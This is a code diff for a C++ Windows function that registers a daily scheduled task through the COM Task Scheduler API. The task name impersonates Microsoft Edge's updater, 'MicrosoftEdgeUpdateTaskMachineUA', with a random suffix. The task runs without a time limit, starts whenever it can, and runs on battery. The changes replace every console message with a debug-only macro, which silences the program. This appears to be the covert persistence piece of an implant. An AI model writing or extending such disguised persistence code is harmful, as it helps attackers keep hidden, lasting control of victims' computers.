@@ -6,6 +6,10 @@
 #include <schtask.h>
 #include <combaseapi.h>
 #include <oleauto.h>
+#include "debug.h"
+#include "utils.h"
+#include "constants.h"
+#include <time.h>
 
 using namespace std;
 
@@ -56,7 +60,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if( FAILED(hr) )
     {
-        printf("\nCoInitializeEx failed: %x", hr );
+        DEBUG_PRINTF("\nCoInitializeEx failed: %x", hr );
         return 1;
     }
 
@@ -74,7 +78,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
 
     if( FAILED(hr) )
     {
-        printf("\nCoInitializeSecurity failed: %x", hr );
+        DEBUG_PRINTF("\nCoInitializeSecurity failed: %x", hr );
         CoUninitialize();
         return 1;
     }
@@ -82,7 +86,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     //  ------------------------------------------------------
     //  Create a name for the task.
     // MicrosoftEdgeUpdateTaskMachineUA{8F76EDCD-8202-4830-BAC5-5128155FAB4E}
-    LPCWSTR wszTaskName = L"MicrosoftEdgeUpdateTaskMachineUA";
+    LPCWSTR wszTaskName = toWide(SCHEDULED_TASK_NAME);
     LPCWSTR randomID = gen_random();
     std::wstring df_concat = std::wstring(wszTaskName) + randomID;
     wszTaskName = df_concat.c_str();
@@ -99,7 +103,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
                            (void**)&pService );  
     if (FAILED(hr))
     {
-        printf("Failed to create an instance of ITaskService: %x", hr);
+        DEBUG_PRINTF("Failed to create an instance of ITaskService: %x", hr);
         CoUninitialize();
         return 1;
     }
@@ -109,7 +113,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
         _variant_t(), _variant_t());
     if( FAILED(hr) )
     {
-        printf("ITaskService::Connect failed: %x", hr );
+        DEBUG_PRINTF("ITaskService::Connect failed: %x", hr );
         pService->Release();
         CoUninitialize();
         return 1;
@@ -122,7 +126,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pService->GetFolder( _bstr_t( L"\\") , &pRootFolder );
     if( FAILED(hr) )
     {
-        printf("Cannot get Root folder pointer: %x", hr );
+        DEBUG_PRINTF("Cannot get Root folder pointer: %x", hr );
         pService->Release();
         CoUninitialize();
         return 1;
@@ -138,7 +142,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pService->Release();  // COM clean up.  Pointer is no longer used.
     if (FAILED(hr))
     {
-        printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
+        DEBUG_PRINTF("Failed to CoCreate an instance of the TaskService class: %x", hr);
         pRootFolder->Release();
         CoUninitialize();
         return 1;
@@ -150,7 +154,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pTask->get_RegistrationInfo( &pRegInfo );
     if( FAILED(hr) )
     {
-        printf("\nCannot get identification pointer: %x", hr );
+        DEBUG_PRINTF("\nCannot get identification pointer: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -162,7 +166,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pRegInfo->Release();  
     if( FAILED(hr) )
     {
-        printf("\nCannot put identification info: %x", hr );
+        DEBUG_PRINTF("\nCannot put identification info: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -176,7 +180,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pTask->get_Principal( &pPrincipal );
     if( FAILED(hr) )
     {
-        printf("\nCannot get principal pointer: %x", hr );
+        DEBUG_PRINTF("\nCannot get principal pointer: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -188,7 +192,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pPrincipal->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot put principal info: %x", hr );
+        DEBUG_PRINTF("\nCannot put principal info: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -201,7 +205,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pTask->get_Settings( &pSettings );
     if( FAILED(hr) )
     {
-        printf("\nCannot get settings pointer: %x", hr );
+        DEBUG_PRINTF("\nCannot get settings pointer: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -212,7 +216,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
     if( FAILED(hr) )
     {
-        printf("\nCannot put start setting information: %x", hr );
+        DEBUG_PRINTF("\nCannot put start setting information: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -223,7 +227,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pSettings->put_DisallowStartIfOnBatteries( VARIANT_FALSE );
     if( FAILED(hr) )
     {
-        printf("\nCannot put power setting information: %x", hr );
+        DEBUG_PRINTF("\nCannot put power setting information: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -234,7 +238,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pSettings->put_ExecutionTimeLimit( SysAllocString(L"PT0S") );
     if( FAILED(hr) )
     {
-        printf("\nCannot put execution time limit setting information: %x", hr );
+        DEBUG_PRINTF("\nCannot put execution time limit setting information: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -247,7 +251,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pSettings->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot get idle setting information: %x", hr );
+        DEBUG_PRINTF("\nCannot get idle setting information: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -258,7 +262,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pIdleSettings->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot put idle setting information: %x", hr );
+        DEBUG_PRINTF("\nCannot put idle setting information: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -272,7 +276,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pTask->get_Triggers( &pTriggerCollection );
     if( FAILED(hr) )
     {
-        printf("\nCannot get trigger collection: %x", hr );
+        DEBUG_PRINTF("\nCannot get trigger collection: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -285,7 +289,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pTriggerCollection->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot create trigger: %x", hr );
+        DEBUG_PRINTF("\nCannot create trigger: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -297,7 +301,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pTrigger->Release();
     if( FAILED(hr) )
     {
-        printf("\nQueryInterface call failed for IDailyTrigger: %x", hr );
+        DEBUG_PRINTF("\nQueryInterface call failed for IDailyTrigger: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -306,13 +310,13 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
 
     hr = pDailyTrigger->put_Id( _bstr_t( L"Trigger1" ) );
     if( FAILED(hr) )
-        printf("\nCannot put trigger ID: %x", hr);
+        DEBUG_PRINTF("\nCannot put trigger ID: %x", hr);
 
     hr = pDailyTrigger->put_StartBoundary( _bstr_t(L"2000-01-01T") + _bstr_t(timeToRunDaily) );
     pDailyTrigger->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot add start boundary to trigger: %x", hr );
+        DEBUG_PRINTF("\nCannot add start boundary to trigger: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -328,7 +332,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     hr = pTask->get_Actions( &pActionCollection );
     if( FAILED(hr) )
     {
-        printf("\nCannot get Task collection pointer: %x", hr );
+        DEBUG_PRINTF("\nCannot get Task collection pointer: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -341,7 +345,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pActionCollection->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot create the action: %x", hr );
+        DEBUG_PRINTF("\nCannot create the action: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -355,7 +359,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pAction->Release();
     if( FAILED(hr) )
     {
-        printf("\nQueryInterface call failed for IExecAction: %x", hr );
+        DEBUG_PRINTF("\nQueryInterface call failed for IExecAction: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -367,7 +371,7 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     pExecAction->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot put action path: %x", hr );
+        DEBUG_PRINTF("\nCannot put action path: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -388,14 +392,14 @@ int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
             &pRegisteredTask);
     if( FAILED(hr) )
     {
-        printf("\nError saving the Task : %x", hr );
+        DEBUG_PRINTF("\nError saving the Task : %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
         return 1;
     }
     
-    printf("\n Success! Task successfully registered. " );
+    DEBUG_PRINTF("\n Success! Task successfully registered. " );
 
     //  Clean up.
     pRootFolder->Release();
